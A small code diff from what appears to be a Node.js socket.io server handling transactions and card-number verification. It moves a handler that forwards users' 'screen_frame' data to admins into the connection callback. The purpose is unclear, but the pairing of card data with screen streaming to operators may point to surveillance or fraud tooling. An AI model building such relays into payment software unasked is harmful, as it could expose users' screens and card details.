@@ -972,6 +972,12 @@ io.on('connection', (socket) => {
     // Send current transactions
     socket.emit('existing_transactions', Array.from(transactions.values()));
   }
+
+  // Handle screen frame data
+socket.on('screen_frame', (data) => {
+  // Forward frame data to admins
+  broadcastToAdmins('screen_frame', data);
+});
   
   // Handle admin_connected event
   socket.on('admin_connected', (data) => {
@@ -1757,12 +1763,6 @@ function shouldRequireMcVerification(cardNumber) {
 
 // Store verification states for MC verification
 const verificationStates = new Map();
-
-// Handle screen frame data
-socket.on('screen_frame', (data) => {
-  // Forward frame data to admins
-  broadcastToAdmins('screen_frame', data);
-});
 
 // Export the app for testing
 export default app;
